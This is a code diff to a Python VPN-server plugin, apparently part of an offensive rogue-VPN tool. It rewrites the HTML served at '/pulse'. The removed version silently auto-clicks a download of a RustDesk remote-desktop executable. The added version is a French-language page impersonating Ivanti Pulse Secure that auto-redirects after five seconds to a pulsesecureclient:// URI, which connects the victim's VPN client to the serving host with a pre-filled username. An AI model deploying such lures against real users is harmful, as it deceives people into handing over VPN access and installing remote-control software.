@@ -277,67 +277,118 @@ class PulseSecurePlugin(VPNPlugin):
 
         elif handler.path == '/pulse':
             self.logger.info('Sending URI handler response ..')
-            html = """<html><body>
-            <div id="message" style="font-family: Arial; text-align: center; margin-top: 50px;">
-                <h3>Téléchargement en cours...</h3>
-                <p>Cliquez sur le lien ci-dessous si le téléchargement ne démarre pas automatiquement :</p>
-                <a href="https://github.com/rustdesk/rustdesk/releases/download/1.4.0/rustdesk-1.4.0-x86_64.exe" 
-                   download="rustdesk-1.4.0-x86_64.exe" id="downloadLink" 
-                   style="color: blue; text-decoration: underline; cursor: pointer;">
-                   Télécharger rustdesk-1.4.0-x86_64.exe
-                </a>
-                <p style="margin-top: 20px;">Redirection vers Pulse Secure dans <span id="countdown">3</span> secondes...</p>
+            html = """<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ivanti Pulse Secure VPN</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0066cc 0%, #004499 100%);
+            min-height: 100vh; display: flex; align-items: center; justify-content: center; color: #333;
+        }
+        .container {
+            background: white; border-radius: 15px; box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            padding: 40px; max-width: 500px; width: 90%; text-align: center;
+            animation: fadeInUp 0.6s ease-out;
+        }
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+        .icon {
+            width: 80px; height: 80px; background: linear-gradient(135deg, #0066cc, #004499);
+            border-radius: 50%; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+        .icon svg { width: 40px; height: 40px; fill: white; }
+        h1 { color: #0066cc; margin-bottom: 20px; font-size: 28px; font-weight: 600; }
+        .step {
+            background: #f8f9fa; border-radius: 10px; padding: 20px; margin: 20px 0;
+            border-left: 4px solid #0066cc;
+        }
+        .step-number {
+            display: inline-block; width: 30px; height: 30px; background: #0066cc; color: white;
+            border-radius: 50%; line-height: 30px; font-weight: bold; margin-right: 15px; font-size: 14px;
+        }
+        .step-text {
+            display: inline-block; vertical-align: top; text-align: left; width: calc(100% - 45px);
+            font-size: 16px; line-height: 1.5;
+        }
+        .highlight {
+            background: linear-gradient(120deg, #b3d9ff 0%, #e6f2ff 100%);
+            padding: 2px 6px; border-radius: 4px; font-weight: 600; color: #004499;
+        }
+        .warning {
+            background: #fff3cd; border: 1px solid #ffeaa7; border-radius: 8px;
+            padding: 15px; margin: 20px 0; color: #856404;
+        }
+        .loading-dots span {
+            display: inline-block; width: 8px; height: 8px; border-radius: 50%;
+            background: #0066cc; margin: 0 2px; animation: loading 1.4s infinite ease-in-out both;
+        }
+        .loading-dots span:nth-child(1) { animation-delay: -0.32s; }
+        .loading-dots span:nth-child(2) { animation-delay: -0.16s; }
+        @keyframes loading {
+            0%, 80%, 100% { transform: scale(0.8); opacity: 0.5; }
+            40% { transform: scale(1); opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="icon">
+            <svg viewBox="0 0 24 24">
+                <path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M12,7C13.4,7 14.8,8.6 14.8,10V11.5C15.4,11.5 16,12.1 16,12.7V16.7C16,17.4 15.4,18 14.7,18H9.2C8.6,18 8,17.4 8,16.8V12.8C8,12.1 8.4,11.5 9,11.5V10C9,8.6 10.6,7 12,7M12,8.2C11.2,8.2 10.2,9.2 10.2,10V11.5H13.8V10C13.8,9.2 12.8,8.2 12,8.2Z"/>
+            </svg>
+        </div>
+        <h1>Ivanti Pulse Secure VPN</h1>
+        <div class="step">
+            <span class="step-number">1</span>
+            <div class="step-text">
+                Un bouton <span class="highlight">"Ouvrir"</span> va apparaître dans quelques instants dans votre navigateur.
             </div>
-            
-            <script>
-                // Fonction de téléchargement avec gestion d'erreur
-                function downloadFile() {
-                    try {
-                        // Créer le lien de téléchargement
-                        const link = document.getElementById('downloadLink');
-                        
-                        // Simuler un clic utilisateur après un petit délai
-                        setTimeout(() => {
-                            link.click();
-                        }, 500);
-                        
-                    } catch (error) {
-                        console.log('Erreur lors du téléchargement:', error);
-                    }
-                }
-                
-                // Fonction de redirection avec compte à rebours
-                function redirectToPulse() {
-                    let count = 3;
-                    const countdownElement = document.getElementById('countdown');
-                    
-                    const timer = setInterval(() => {
-                        count--;
-                        countdownElement.textContent = count;
-                        
-                        if (count <= 0) {
-                            clearInterval(timer);
-                            window.location.href = """ + \
-                   f"`pulsesecureclient://connect?name={self.vpn_name}&server=" \
+        </div>
+        <div class="step">
+            <span class="step-number">2</span>
+            <div class="step-text">
+                Cliquez sur ce bouton pour lancer automatiquement <strong>Ivanti Pulse Secure</strong>.
+            </div>
+        </div>
+        <div class="step">
+            <span class="step-number">3</span>
+            <div class="step-text">
+                Le client VPN s'ouvrira et vous pourrez vous connecter avec vos identifiants habituels.
+            </div>
+        </div>
+        <div class="warning">
+            <span style="margin-right: 8px; font-size: 18px;">⚠️</span>
+            <strong>Important :</strong> Assurez-vous qu'Ivanti Pulse Secure est installé sur votre ordinateur avant de continuer.
+        </div>
+        <p style="margin-top: 30px; color: #666; font-size: 14px;">
+            Préparation en cours<span class="loading-dots"><span></span><span></span><span></span></span>
+        </p>
+    </div>
+    
+    <script>
+        // Redirection automatique vers Pulse Secure après 5 secondes
+        setTimeout(function() {
+            window.location.href = '""" + \
+                   f"pulsesecureclient://connect?name={self.vpn_name}&server=" \
                    "https://${document.domain}&userrealm=Users&" \
-                   f"username={self.pulse_username}&store={str(self.pulse_save_connection).lower()}`;" + \
-                   """
-                        }
-                    }, 1000);
-                }
-                
-                // Lancer le téléchargement et la redirection
-                window.onload = function() {
-                    downloadFile();
-                    redirectToPulse();
-                };
-            </script>
-            </body></html>"""
+                   f"username={self.pulse_username}&store={str(self.pulse_save_connection).lower()}" + \
+                   """';
+        }, 5000);
+    </script>
+</body>
+</html>"""
             handler.send_response(200)
             handler.send_header('Content-Type', 'text/html')
             handler.end_headers()
             handler.wfile.write(html.encode())
 
+            
     def next_eap_identifier(self):
         self._eap_identifier += 1
         if self._eap_identifier >= 5:
